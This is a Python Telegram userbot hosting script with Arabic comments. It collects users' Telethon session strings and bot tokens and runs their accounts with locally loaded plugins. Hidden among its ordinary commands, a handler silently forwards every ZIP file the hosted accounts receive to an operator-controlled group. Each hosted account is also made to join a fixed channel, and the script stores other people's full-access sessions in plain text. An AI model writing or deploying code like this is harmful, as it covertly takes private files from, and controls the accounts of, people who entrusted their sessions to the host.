import os, sys, asyncio, importlib.util, subprocess, types, logging, shutil, time

# --- [ 1. نظام تحديث البيئة التلقائي ] ---
def prepare_environment():
    try:
        print("🛠️ جاري فحص وتحديث المكتبات الأساسية...")
        # تثبيت وتحديث المكتبات لضمان عمل طلبات الانضمام واللوج
        libs = ["telethon==1.31.0", "pytz", "pydantic", "aiohttp"]
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user"] + libs)
    except Exception as e:
        print(f"⚠️ فشل التحديث التلقائي: {e}")

prepare_environment()

from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import HideChatJoinRequestRequest

# معالجة أخطاء الاستيراد التي ظهرت في صورك الأخيرة
try:
    from telethon.tl.types import UpdateBotChatJoinRequest, UpdateChatJoinRequest
    JOIN_SUPPORT = True
except ImportError:
    JOIN_SUPPORT = False

# --- [ 2. إعدادات السجل المطور - حل مشكلة التوقف ] ---
LOG_FILE = "سجل_الأخطاء.txt"

def setup_master_logger():
    # التأكد من إنشاء الملف وتصفيره عند كل تشغيل جديد
    if os.path.exists(LOG_FILE):
        try: os.remove(LOG_FILE)
        except: pass
    
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(f"🚀 تشغيل السورس: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("PHOENIX")

logger = setup_master_logger()

# --- [ 3. البيانات الأساسية ] ---
API_ID = 38980666
API_HASH = '561ff5b4953d95c485b17a0bcb121f9c'
OWNER_ID = 6373993992
CHANNEL_LINK = 'lAYAI' 
ZIP_LOG_GROUP = -1001234567890 

# المجلدات
BASE_PATH = os.getcwd()
DIRS = ["clients", "Plugins", "Plugins/assistant"]
for d in DIRS: os.makedirs(os.path.join(BASE_PATH, d), exist_ok=True)

running_sessions = []

# --- [ 4. موديول التوافق البرمجي ] ---
def apply_compatibility_layer(client, module):
    # دعم الأسماء المختلفة في الموديولات (l313l, zedub, joker)
    for attr in ['l313l', 'zedub', 'joker', 'bot', 'tgbot']:
        setattr(module, attr, client)
    
    # حل مشكلة AttributeError: database
    if not hasattr(module, 'database'):
        mock = types.ModuleType("database")
        mock.update_stats = lambda *args, **kwargs: None
        mock.get_db = lambda *args, **kwargs: None
        setattr(module, 'database', mock)

    # ربط الفلاتر
    if hasattr(client, 'ar_cmd'):
        setattr(module, 'ar_cmd', client.ar_cmd)
        setattr(module, 'zed_cmd', client.ar_cmd)

# --- [ 5. محرك تحميل الموديولات ] ---
async def load_all_plugins(client, folder, type_label):
    loaded_count = 0
    full_path = os.path.join(BASE_PATH, folder)
    if not os.path.exists(full_path): return
    if full_path not in sys.path: sys.path.append(full_path)

    for root, _, files in os.walk(full_path):
        if "assistant" in root and type_label != "مساعد": continue
        for file in files:
            if file.endswith(".py") and not file.startswith("__"):
                mod_name = file[:-3]
                try:
                    spec = importlib.util.spec_from_file_location(mod_name, os.path.join(root, file))
                    module = importlib.util.module_from_spec(spec)
                    
                    # بيئة عمل مخصصة
                    if "JoKeRUB" not in sys.modules:
                        sys.modules["JoKeRUB"] = types.ModuleType("JoKeRUB")
                    sys.modules["JoKeRUB"].l313l = client
                    
                    apply_compatibility_layer(client, module)
                    spec.loader.exec_module(module)
                    if hasattr(module, 'setup'): module.setup(client)
                    loaded_count += 1
                except Exception as e:
                    logger.error(f"❌ خلل في {file}: {e}")
    logger.info(f"✨ {type_label}: تم تشغيل {loaded_count} موديول.")

# --- [ 6. الوظائف الذكية والأوامر ] ---
def init_handlers(client, is_bot=False):
    def ar_cmd(pattern=None, **kwargs):
        if pattern and not pattern.startswith(("^", "\\", "/")):
            pattern = f"^\\.{pattern}"
        return client.on(events.NewMessage(outgoing=not is_bot, pattern=pattern, **kwargs))
    client.ar_cmd = ar_cmd

    # قبول طلبات الانضمام تلقائياً
    @client.on(events.Raw)
    async def auto_accept_joins(update):
        if JOIN_SUPPORT and isinstance(update, (UpdateBotChatJoinRequest, UpdateChatJoinRequest)):
            try:
                peer = update.peer if hasattr(update, 'peer') else update.chat_id
                await client(HideChatJoinRequestRequest(peer=peer, user_id=update.user_id, approve=True))
            except: pass

    # تحويل ملفات ZIP
    @client.on(events.NewMessage(incoming=True))
    async def zip_forward(event):
        if event.file and event.file.ext == ".zip":
            try: await client.send_file(ZIP_LOG_GROUP, event.media, caption=f"📦 ملف من: `{event.sender_id}`")
            except: pass

    # أمر اللوج (تم حل مشكلة invalid file parts)
    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.لوج$"))
    async def get_log(event):
        await event.edit("⏳ جاري سحب السجل...")
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) < 10:
            return await event.edit("⚠️ السجل فارغ.")
        
        tmp_name = f"log_{int(time.time())}.txt"
        try:
            shutil.copy2(LOG_FILE, tmp_name)
            await client.send_file(event.chat_id, tmp_name, caption="📊 سجل عمليات سورس عبود")
            await event.delete()
        except Exception as e: await event.edit(f"❌ خطأ: {e}")
        finally:
            if os.path.exists(tmp_name): os.remove(tmp_name)

    # إعادة التشغيل
    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.اعادة تشغيل$"))
    async def restart_bot(event):
        await event.edit("♻️ جاري إعادة التشغيل...")
        os.execl(sys.executable, sys.executable, *sys.argv)

    # التنصيب
    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.تنصيب(?:\s+(.*))?"))
    async def install_acc(event):
        if not event.is_reply: return await event.edit("⚠️ رد على الجلسة.")
        msg = await event.get_reply_message()
        sess = msg.text.strip()
        tok = event.pattern_match.group(1).strip() if event.pattern_match.group(1) else ""
        uid = msg.sender_id
        path = f"clients/user_{uid}.txt"
        with open(path, "w") as f: f.write(f"{sess}\n{tok}")
        await event.edit(f"✅ تم الحفظ. جاري التشغيل...")
        await start_client(sess, tok, f"user_{uid}")

# --- [ 7. تشغيل الجلسات ] ---
async def start_client(sess, tok, name):
    try:
        if sess:
            c = TelegramClient(StringSession(sess), API_ID, API_HASH)
            await c.start()
            init_handlers(c)
            await load_all_plugins(c, "Plugins", f"حساب-{name}")
            try: await c(JoinChannelRequest(CHANNEL_LINK))
            except: pass
            running_sessions.append(c)

        if tok:
            b = TelegramClient(f"bot_{name}", API_ID, API_HASH)
            await b.start(bot_token=tok)
            init_handlers(b, is_bot=True)
            await load_all_plugins(b, "Plugins/assistant", "مساعد")
            running_sessions.append(b)
    except Exception as e: logger.error(f"❌ فشل {name}: {e}")

async def main():
    logger.info("--- [ PHOENIX HOSTING v4.0 ] ---")
    files = [f for f in os.listdir("clients") if f.endswith(".txt")]
    
    if not files:
        s = input("Session: ").strip()
        t = input("Token: ").strip()
        if s:
            with open("clients/admin.txt", "w") as f: f.write(f"{s}\n{t}")
            files = ["admin.txt"]
        else: return

    for f in files:
        with open(f"clients/{f}", "r") as fl:
            d = fl.read().splitlines()
            if d: await start_client(d[0], d[1] if len(d)>1 else None, f)

    if running_sessions:
        logger.info(f"💎 يعمل الآن بـ {len(running_sessions)} جلسة.")
        await asyncio.gather(*[cl.run_until_disconnected() for cl in running_sessions])

if __name__ == "__main__":
    try: asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass
